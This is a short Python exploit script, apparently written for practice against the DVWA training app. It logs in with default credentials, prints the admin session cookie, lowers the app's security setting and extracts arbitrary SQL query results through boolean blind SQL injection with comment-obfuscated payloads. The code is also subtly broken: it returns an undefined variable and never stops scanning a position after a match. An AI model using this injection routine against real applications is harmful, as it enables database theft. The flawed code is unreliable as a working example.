import requests
import re
import sys

s = requests.Session()

def login(rhost):

    login_url = "http://{}/dvwa/login.php".format(rhost)
    #req = s.get(login_url)
    #match = re.search(r'([a-z,0-9]){32}', req.text)
    #token = match.group(0)
    data = {'username':'admin','password':'password','Login':'Login'}#,'user_token':token}
    login = s.post(login_url, data=data)
    if "Welcome" in login.text:
        print("login successful")
        print("admin cookie: {}".format(s.cookies["PHPSESSID"]))
    #return s

def sec(rhost):

    sec_url = "http://{}/dvwa/security.php".format(rhost)
    #req = s.get(login_url)
    #match = re.search(r'([a-z,0-9]){32}', req.text)
    #token = match.group(0)
    data = {'security':'low','seclev_submit':'Submit'}#,'user_token':token}
    sec = s.post(sec_url, data=data)
    print("security set low.")

def blindSqli(rhost, my_query):
    extracted_data = ""
    for index in range(1,33):
        for i in range(32, 126):
            query = "1'/**/or/**/(SELECT/**/ascii(substring(({}),{},1)))={}/**/%23".format(my_query.replace(" ", "/**/"),index,i)
            r = s.get("http://{}/dvwa/vulnerabilities/sqli_blind/?id={}&Submit=Submit#".format(rhost,query))
            if "User ID exists" in r.text:
                extracted_data += chr(i)
                sys.stdout.write(chr(i))
                sys.stdout.flush()
    return session_object, extracted_data

def main():
    rhost = sys.argv[1]
    my_query = sys.argv[2]
    #sess = login(rhost)
    #sess = sec(rhost)
    extracted_data = blindSqli(rhost, my_query)
    print("")
    print("The query result is: {}".format(extracted_data))
        
if __name__ == "__main__":
    main()
